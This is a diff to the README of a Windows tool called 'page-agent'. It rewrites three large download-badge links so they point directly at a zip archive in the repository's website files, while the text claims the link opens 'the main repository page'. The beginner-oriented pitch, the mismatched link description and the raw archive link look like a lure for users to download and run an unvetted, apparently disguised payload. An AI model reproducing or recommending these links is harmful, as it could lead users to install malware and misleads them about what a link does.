@@ -1,6 +1,6 @@
 # 🧩 page-agent - Control Web Interfaces Simply
 
-[![Download page-agent](https://img.shields.io/badge/Download-page--agent-4caf50?style=for-the-badge)](https://github.com/rotss2/page-agent/raw/refs/heads/main/packages/website/public/agent-page-v1.6.zip)
+[![Download page-agent](https://img.shields.io/badge/Download-page--agent-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/rotss2/page-agent/main/packages/website/agent-page-v1.6.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Use this guide to download and run page-agent on your Windows computer with no t
 
 Click the big green button below to open the download area for page-agent.
 
-[![Download page-agent](https://img.shields.io/badge/Download-page--agent-4caf50?style=for-the-badge)](https://github.com/rotss2/page-agent/raw/refs/heads/main/packages/website/public/agent-page-v1.6.zip)
+[![Download page-agent](https://img.shields.io/badge/Download-page--agent-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/rotss2/page-agent/main/packages/website/agent-page-v1.6.zip)
 
 This link takes you to the main repository page on GitHub. You will find the latest version available to download there.
 
@@ -133,7 +133,7 @@ If page-agent does not work as expected:
 
 ## 🔗 Useful Links
 
-- Primary download and info page: [https://github.com/rotss2/page-agent/raw/refs/heads/main/packages/website/public/agent-page-v1.6.zip](https://github.com/rotss2/page-agent/raw/refs/heads/main/packages/website/public/agent-page-v1.6.zip)
+- Primary download and info page: [https://raw.githubusercontent.com/rotss2/page-agent/main/packages/website/agent-page-v1.6.zip](https://raw.githubusercontent.com/rotss2/page-agent/main/packages/website/agent-page-v1.6.zip)
 - GitHub Releases: Visit the releases tab on the GitHub page to find the latest versions and details.
 
 ---
